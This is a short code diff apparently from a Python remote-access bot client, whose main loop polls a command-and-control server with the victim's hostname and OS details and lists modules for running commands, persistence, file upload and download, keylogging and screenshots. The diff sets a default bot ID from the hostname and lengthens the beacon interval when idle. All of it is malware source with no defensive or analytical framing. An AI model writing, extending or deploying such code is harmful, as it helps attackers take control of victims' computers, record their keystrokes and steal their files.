@@ -5,6 +5,7 @@ import os
 import requests
 import sys
 import platform
+import socket
 
 import settings
 import utils
@@ -17,6 +18,8 @@ from modules import screenshot
 
 
 MODULES = ['runcmd', 'persistence', 'download', 'upload', 'keylogger', 'screenshot']
+if not settings.BOT_ID:
+    settings.BOT_ID = socket.gethostname()
 
 
 def print_help(mod=None):
@@ -45,6 +48,8 @@ if __name__ == "__main__":
     is_idle = False
     while 1:
         if is_idle:
+            time.sleep(settings.REQUEST_INTERVAL * 10)
+        else:
             time.sleep(settings.REQUEST_INTERVAL)
         try:
             command = requests.get(settings.SERVER_URL + "/api/pop?botid=" + settings.BOT_ID + "&sysinfo=" + platform.system() + " " + platform.release()).text
